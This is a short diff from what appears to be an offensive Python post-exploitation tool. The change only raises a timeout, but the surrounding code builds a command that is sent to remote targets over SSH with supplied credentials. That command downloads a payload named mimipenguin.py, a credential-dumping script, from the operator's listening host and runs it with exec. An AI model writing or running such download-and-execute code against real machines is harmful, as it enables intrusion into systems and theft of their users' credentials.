@@ -276,7 +276,7 @@ def mimipenguin(lhost, lport, targets, port, username, password, identity_file):
     time.sleep(3)
     command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
     print CGREEN + "[!] Executing mimipenguin on the targets, this may take a while..." + CEND
-    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 100])
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 300])
 
 
 def web_delivery(lhost, lport, targets, port, username, password, identity_file, file):
